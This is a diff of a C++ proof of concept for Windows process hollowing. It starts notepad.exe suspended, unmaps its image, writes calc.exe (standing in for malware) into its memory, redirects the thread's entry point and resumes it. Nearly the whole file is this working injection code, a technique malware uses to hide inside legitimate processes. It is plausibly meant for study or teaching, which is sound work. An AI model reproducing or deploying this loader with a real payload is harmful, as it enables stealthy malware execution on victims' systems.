@@ -1,27 +1,27 @@
 //Author: Alec Wood
 //File: ProcHollow.cpp
-//Purpose: Proof of concept for Process Hollowing, using target: calc.exe and malware: Mal1.exe
+//Purpose: Proof of concept for Process Hollowing, using target: notepad.exe and malware: calc.exe
 
 #include<Windows.h>
 #include<iostream>
 #include<stdio.h>
 #pragma comment(lib, "ntdll.lib")
-using namespace std; //Need to remove and update entire source code
+
 
 //This declaration will be used to hollow the process
-LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);
+typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);
 
 
 int main() {
 
 	LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
 	LPPROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
-	CONTEXT c;
+	CONTEXT c{};
 
 
 	//Create victim process in suspended state
 	if (CreateProcessA(
-		(LPSTR)"C:\\Windows\\System32\\calc.exe",
+		(LPSTR)"C:\\Windows\\System32\\notepad.exe",
 		NULL,
 		NULL,
 		NULL,
@@ -36,9 +36,9 @@ int main() {
 	}
 
 
-	//Pass Mal1 to get handle
+	//Pass Malware to get handle
 	HANDLE hMalware = CreateFileA(
-		(LPCSTR)"C:\\Windows\\System32\\notepad.exe",
+		(LPCSTR)"C:\\Windows\\System32\\calc.exe",
 		GENERIC_READ,
 		FILE_SHARE_READ,
 		NULL,
@@ -46,21 +46,21 @@ int main() {
 		NULL,
 		NULL
 	);
-	std::cout << "[+] PID-> 0x" << processInfo->dwProcessId << endl;
+	std::cout << "[+] PID-> 0x" << processInfo->dwProcessId << std::endl;
 
 	if (hMalware == INVALID_HANDLE_VALUE) {
-		std::cout << "[!] Failed to open: " << GetLastError() << endl;
+		std::cout << "[!] Failed to open: " << GetLastError() << std::endl;
 		TerminateProcess(processInfo->hProcess, 0);
 	}
-	std::cout << "[+] Malicious file opened." << endl;
+	std::cout << "[+] Malware file opened." << std::endl;
 
 
-	//Retrieve size of Mal1 to use in VirtualAlloc().
+	//Retrieve size of Malware to use in VirtualAlloc().
 	DWORD malwareFileSize = GetFileSize(hMalware, 0);
-	std::cout << "[+] Mal1 file size: " << malwareFileSize << " bytes." << endl;
+	std::cout << "[+] Malware file size: " << malwareFileSize << " bytes." << std::endl;
 
 
-	//Allocating memory for Mal1
+	//Allocating memory for Malware
 	PVOID pMalwareImage = VirtualAlloc(
 		NULL,
 		malwareFileSize,
@@ -71,7 +71,8 @@ int main() {
 
 	DWORD numberOfBytesRead;
 
-	//Writes Mal1 into allocated memory
+
+	//Writes Malware into allocated memory
 	if (!ReadFile(
 		hMalware,
 		pMalwareImage,
@@ -79,13 +80,110 @@ int main() {
 		&numberOfBytesRead,
 		NULL
 	)) {
-		std::cout << "[!] Unable to read. Error: " << GetLastError() << endl;
+		std::cout << "[!] Unable to read. Error: " << GetLastError() << std::endl;
 		TerminateProcess(processInfo->hProcess, 0);
 		return 1;
 	}
 
+
 	CloseHandle(hMalware);
-	std::cout << "[+] Wrote Mal1 into memory at: 0x" << pMalwareImage << endl;
+	std::cout << "[+] Wrote Malware into memory at: 0x" << pMalwareImage << std::endl;
+
+
+	//Using context structure pointer c, pull thread context for target process.
+	c.ContextFlags = CONTEXT_INTEGER;
+	GetThreadContext(processInfo->hThread, &c);
+
+
+	//Find base address of Target process
+	PVOID pTargetBaseAddress = nullptr;
+	ReadProcessMemory(
+		processInfo->hProcess,
+		(PVOID)(c.Ebx + 8),
+		&pTargetBaseAddress,
+		sizeof(PVOID),
+		0
+	);
+	std::cout << "[+] Target Base Address : 0x" << pTargetBaseAddress << std::endl;
+
+
+	//Hollow process 
+	HMODULE hDllBase = GetModuleHandleA("ntdll.dll");
+	pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hDllBase, "ZwUnmapViewOfSection");
+
+
+	DWORD result = pZwUnmapViewOfSection(processInfo->hProcess, pTargetBaseAddress);
+	if (result) {
+		std::cout << "[!] Unmap failed." << std::endl;
+		TerminateProcess(processInfo->hProcess, 1);
+		return 1;
+	}
+
+	std::cout << "[+] Process hollowed at Base: 0x" << pTargetBaseAddress << std::endl;
+
+
+	//get Malware size from NT Headers
+	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMalwareImage;
+	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMalwareImage + pDOSHeader->e_lfanew);
+
+	DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage;
+
+	std::cout << "[+] Malware Base Address: 0x" << pNTHeaders->OptionalHeader.ImageBase << std::endl;
+
+
+	PVOID pHollow = VirtualAllocEx(
+		processInfo->hProcess,
+		pTargetBaseAddress,
+		sizeOfMaliciousImage,
+		0x3000,
+		0x40
+	);
+	if (pHollow == NULL) {
+		std::cout << "[!] Memory allocation failed. Error: " << GetLastError() << std::endl;
+		TerminateProcess(processInfo->hProcess, 0);
+		return 1;
+	}
+
+	std::cout << "[+] Memory allocated at: 0x" << pHollow << std::endl;
+
+
+	//write malware headers into target
+	if (!WriteProcessMemory(
+		processInfo->hProcess,
+		pTargetBaseAddress,
+		pMalwareImage,
+		pNTHeaders->OptionalHeader.SizeOfHeaders,
+		NULL
+	)) {
+		std::cout << "[!] Writing Headers failed. Error: " << GetLastError() << std::endl;
+	}
+	std::cout << "[+] Headers written to memory." << std::endl;
+
+
+	//write malware sections into target
+	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
+		PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMalwareImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
+
+		WriteProcessMemory(
+			processInfo->hProcess,
+			(PVOID)((LPBYTE)pHollow + pSectionHeader->VirtualAddress),
+			(PVOID)((LPBYTE)pMalwareImage + pSectionHeader->PointerToRawData),
+			pSectionHeader->SizeOfRawData,
+			NULL
+		);
+	}
+	std::cout << "[+] Sections written to memory." << std::endl;
+
+
+	//change target entry point to malware entry point & resume thread
+	c.Eax = (SIZE_T)((LPBYTE)pHollow + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
+
+	SetThreadContext(processInfo->hThread, &c);
+	ResumeThread(processInfo->hThread);
+
+	system("pause");
+	TerminateProcess(processInfo->hProcess, 0);
 
 	return 0;
+
 }
